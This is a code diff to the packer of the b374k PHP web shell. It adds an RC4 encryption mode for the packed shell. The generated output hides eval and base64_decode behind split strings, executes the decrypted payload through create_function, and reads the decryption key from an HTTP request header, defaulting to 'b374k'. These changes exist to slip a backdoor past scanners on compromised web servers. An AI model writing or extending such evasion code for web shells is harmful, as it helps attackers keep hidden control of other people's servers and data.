@@ -277,7 +277,7 @@ else{
 		$output .= "\t-m modules\t\t\t\tmodules to pack separated by comma\n";
 		$output .= "\t-s\t\t\t\t\tstrip comments and whitespaces\n";
 		$output .= "\t-b\t\t\t\t\tencode with base64\n";
-		$output .= "\t-z [no|gzdeflate|gzencode|gzcompress]\tcompression (use only with -b)\n";
+		$output .= "\t-z [no|gzdeflate|gzencode|gzcompress|rc4]\tcompression (use only with -b)\n";
 		$output .= "\t-c [0-9]\t\t\t\tlevel of compression\n";
 		$output .= "\t-l\t\t\t\t\tlist available modules\n";
 		$output .= "\t-k\t\t\t\t\tlist available themes\n";
@@ -324,7 +324,7 @@ else{
 		$base64 = isset($opt['b'])? "yes":"no";
 
 		$compress = isset($opt['z'])? trim($opt['z']):"no";
-		if(($compress!='gzdeflate')&&($compress!='gzencode')&&($compress!='gzcompress')&&($compress!='no')){
+		if(!in_array($compress, array('gzdeflate','gzencode','gzcompress','rc4','no'))){
 			$output .= "error : unknown options -z ".$compress."\n\n";
 			echo $output;
 			die();
@@ -352,6 +352,7 @@ else{
 		$output .= "Modules\t\t\t: ".implode(",",$modules)."\n";
 		$output .= "Strip\t\t\t: ".$strip."\n";
 		$output .= "Base64\t\t\t: ".$base64."\n";
+		$output .= "RC4 Cipher Key\t\t: " . $GLOBALS['cipher_key'] . "\n";
 		if($base64=='yes') $output .= "Compression\t\t: ".$compress."\n";
 		if($base64=='yes') $output .= "Compression level\t: ".$compress_level."\n";
 
@@ -515,7 +516,7 @@ function packer_b374k($output, $phpcode, $htmlcode, $strip, $base64, $compress, 
 	}
 
 	if(!empty($password)) $password = "\$GLOBALS['pass'] = \"".sha1(md5($password))."\"; // sha1(md5(pass))\n";
-	$cipher_key = "\$GLOBALS['cipher_key'] = \"" . $GLOBALS['cipher_key'] . "\";\n";
+	$cipher_key = "\$GLOBALS['cipher_key'] = \"" . $GLOBALS['cipher_key'] . "\";";
 
 	$compress_level = (int) $compress_level;
 	if($compress_level<0) $compress_level = 0;
@@ -534,6 +535,7 @@ function packer_b374k($output, $phpcode, $htmlcode, $strip, $base64, $compress, 
 	https://github.com/b374k/b374k
 
 */\n";
+	$rc4_function = 'function rc4($a,$b){$c=array();for($d=0;$d<256;$d++){$c[$d]=$d;}$e=0;for($d=0;$d<256;$d++){$e=($e+$c[$d]+ord($a[$d%strlen($a)]))%256;$f=$c[$d];$c[$d]=$c[$e];$c[$e]=$f;}$d=0;$e=0;$g="";for($h=0;$h<strlen($b);$h++){$d=($d+1)%256;$e=($e+$c[$d])%256;$f=$c[$d];$c[$d]=$c[$e];$c[$e]=$f;$g.=$b[$h]^chr($c[($c[$d]+$c[$e])%256]);}return $g;}';
 
 
 	if($strip=='yes'){
@@ -548,6 +550,7 @@ function packer_b374k($output, $phpcode, $htmlcode, $strip, $base64, $compress, 
 
 
 	$content = $phpcode.$htmlcode;
+	$content = preg_replace('/^<\?php/s', '<?php ' . $cipher_key, $content);
 
 	if($compress=='gzdeflate'){
 		$content = gzdeflate($content, $compress_level);
@@ -561,6 +564,10 @@ function packer_b374k($output, $phpcode, $htmlcode, $strip, $base64, $compress, 
 		$content = gzcompress($content, $compress_level);
 		$encoder_func = "gz'.'un'.'com'.'pre'.'ss";
 	}
+	elseif($compress=="rc4"){
+		$content = rc4($GLOBALS['cipher_key'], $content);
+		$encoder_func = "r"."c4";
+	}
 	else{
 		$encoder_func = "";
 	}
@@ -568,20 +575,24 @@ function packer_b374k($output, $phpcode, $htmlcode, $strip, $base64, $compress, 
 	if($base64=='yes'){
 		$content = base64_encode($content);
 		if($compress!='no'){
-			$encoder = $encoder_func."(ba'.'se'.'64'.'_de'.'co'.'de(\$x))";
+			if($compress=="rc4") {
+				$encoder = $encoder_func."(isset(\$_SERVER[\\'HTTP_RC4_KEY\\'])?\$_SERVER[\\'HTTP_RC4_KEY\\']:\\'b374k\\',ba'.'se'.'64'.'_de'.'co'.'de(\$x))";
+			} else {
+				$encoder = $encoder_func."(ba'.'se'.'64'.'_de'.'co'.'de(\$x))";
+			}
 		}
 		else{
 			$encoder = "ba'.'se'.'64'.'_de'.'co'.'de(\"\$x\")";
 		}
 
-		$code = $header.$password.$cipher_key."\$func=\"cr\".\"eat\".\"e_fun\".\"cti\".\"on\";\$b374k=\$func('\$x','ev'.'al'.'(\"?>\".".$encoder.");');\$b374k(\"".$content."\");?>";
+		$code = $header.$password."\$func=\"cr\".\"eat\".\"e_fun\".\"cti\".\"on\";\$b374k=\$func('\$x','ev'.'al'.'(\"?>\".".$encoder.");');\$b374k(\"".$content."\");{$rc4_function}?>";
 	}
 	else{
 		if($compress!='no'){
 			$encoder = $encoder_func."(\$x)";
 		}
 		else{
-			$code = $header.$password.$cipher_key."?>".$content;
+			$code = $header.$password."?>".$content;
 			$code = preg_replace("/\?>\s*<\?php\s*/", "", $code);
 		}
 	}
@@ -602,6 +613,32 @@ function generateRandomString($length = 10) {
         $randomString .= $characters[rand(0, $charactersLength - 1)];
     }
     return $randomString;
+}
+
+function rc4($key, $str) {
+	$s = array();
+	for ($i = 0; $i < 256; $i++) {
+		$s[$i] = $i;
+	}
+	$j = 0;
+	for ($i = 0; $i < 256; $i++) {
+		$j = ($j + $s[$i] + ord($key[$i % strlen($key)])) % 256;
+		$x = $s[$i];
+		$s[$i] = $s[$j];
+		$s[$j] = $x;
+	}
+	$i = 0;
+	$j = 0;
+	$res = '';
+	for ($y = 0; $y < strlen($str); $y++) {
+		$i = ($i + 1) % 256;
+		$j = ($j + $s[$i]) % 256;
+		$x = $s[$i];
+		$s[$i] = $s[$j];
+		$s[$j] = $x;
+		$res .= $str[$y] ^ chr($s[($s[$i] + $s[$j]) % 256]);
+	}
+	return $res;
 }
 
 ?>
